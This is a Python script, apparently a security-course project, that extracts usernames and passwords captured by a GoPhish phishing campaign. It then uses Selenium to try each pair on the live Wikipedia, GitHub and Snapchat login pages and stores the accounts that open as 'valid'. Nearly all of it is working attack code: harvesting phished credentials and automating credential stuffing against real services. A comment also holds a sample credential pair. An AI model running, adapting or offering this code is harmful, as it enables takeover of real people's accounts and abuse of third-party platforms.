#Using Selenium on Replit: https://replit.com/talk/learn/Python-Selenium-Tutorial-The-Basics/148030
#Selenium actions & documentation: https://www.selenium.dev/documentation/webdriver/elements/
#GoPhish API documentation: https://docs.getgophish.com/python-api-client/campaigns & https://docs.getgophish.com/api-documentation/campaigns

import selenium
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from gophish import Gophish
from replit import db

api_key = 'insert API KEY'
api = Gophish(api_key,host='insert URL', verify = False)
campaignID = 8 #specific campaign in GoPhish

######################## RETRIEVING USER CREDENTIALS ###################################
credentials = []
#Loop through timeline events
for i in range(len(api.campaigns.get(campaign_id = campaignID).timeline)):
  #get next timeline event's details. if empty, then it's an unrelated event; if not, it's a browser or login event
  emptyString = api.campaigns.get(campaign_id = campaignID).timeline[i].details
  #check to make sure the next event's details aren't empty
  if emptyString != '':
    #get next event's payload and check if it has "password" attrribute; if so, it's a login event
    browserCheck = api.campaigns.get(campaign_id = campaignID).timeline[i].details['payload']
    #if event is a login event
    if 'password' in browserCheck:
      #retrieve username and password from payload and add as a tuple to credentials list
      password = api.campaigns.get(campaign_id = campaignID).timeline[i].details['payload']['password'][0]
      username = api.campaigns.get(campaign_id = campaignID).timeline[i].details['payload']['wpName'][0]
      credentials.append((username, password))

print(credentials)


######################## VALIDATING USER CREDENTIALS ###################################

for i in range(len(credentials)): #loop through all sets of credentials
  #ensuring selenium can work on Replit
  chrome_options = Options()
  chrome_options.add_argument('--no-sandbox')
  chrome_options.add_argument('--disable-dev-shm-usage')

  browser = webdriver.Chrome(options = chrome_options)

  #for loop here going through DB entries pulling username and password for each entry for verification testing
  username = credentials[i][0]#"Techtestlogin"
  password = credentials[i][1]#"CECS378$$$"
  valid = False

  name = ["Wikipedia", "GitHub", "SnapChat"]
  status = {}

  # URLs needed to make sure the website is running
  wikiUrl = "https://en.wikipedia.org/w/index.php?title=Special:UserLogin&returnto=Login"
  browser.get(wikiUrl)
  wikiSuccessUrl = "https://en.wikipedia.org/wiki/Login"
  wikiUsername = browser.find_element(By.ID, "wpName1")
  wikiPassword = browser.find_element(By.ID, "wpPassword1")
  wikiLoginButton = browser.find_element(By.ID, "wpLoginAttempt")
  wikiUsername.send_keys(username)
  wikiPassword.send_keys(password)
  wikiLoginButton.click()  # need to find actual on html
  currUrl = browser.current_url
  print("\nUsername:", username, "Password:", password)
  print("Testing credentials for", name[0])
  if (currUrl == wikiUrl):
    print(name[0], "login failed. Incorrect credentials.")
    status["Wikipedia"] = 0
  elif (currUrl == wikiSuccessUrl):
    print(name[0], "login successful!")
    status["Wikipedia"] = 1
    valid = True

  githubUrl = "https://github.com/login"
  browser.get(githubUrl)
  githubSuccessUrl = "https://github.com/"
  githubUsername = browser.find_element(By.ID, "login_field")
  githubPassword = browser.find_element(By.ID, "password")
  githubLoginButton = browser.find_element(By.NAME, "commit")
  githubUsername.send_keys(username)
  githubPassword.send_keys(password)
  githubLoginButton.click()  # need to find actual on html
  currUrl = browser.current_url
  print("Testing credentials for", name[1])
  if (currUrl == githubUrl or currUrl == "https://github.com/session"):
    print(name[1], "login failed. Incorrect credentials.")
    status["GitHub"] = 0
  elif (currUrl == githubSuccessUrl):
    print(name[1], "login successful!")
    status["GitHub"] = 1
    valid = True

  snapchatUrl = "https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome"
  browser.get(snapchatUrl)
  snapSuccessUrl = "https://accounts.snapchat.com/accounts/welcome"
  snapUsername = browser.find_element(By.ID, "username")
  snapPassword = browser.find_element(By.ID, "password")
  snapLoginButton = browser.find_element(By.ID, "loginTrigger")
  snapUsername.send_keys(username)
  snapPassword.send_keys(password)
  snapLoginButton.click()  # need to find actual on html
  currUrl = browser.current_url
  print("Testing credentials for", name[2])
  if (currUrl == snapchatUrl):
    print(name[2], "login failed. Incorrect credentials.")
    status["Snapchat"] = 0
  elif (currUrl == snapSuccessUrl):
    print(name[2], "login successful!")
    status["Snapchat"] = 1
    valid = True

  print("See what logins were valid for this victim's data.\n", status)

  credentialStatus = [username, password, status]
  if valid:
    if credentialStatus not in db["valid"]:
      db["valid"].append(credentialStatus)
  else:
    if credentialStatus not in db["invalid"]:
      db["invalid"].append(credentialStatus)

print("\nValid:", db["valid"], "\n\nInvalid:", db["invalid"])
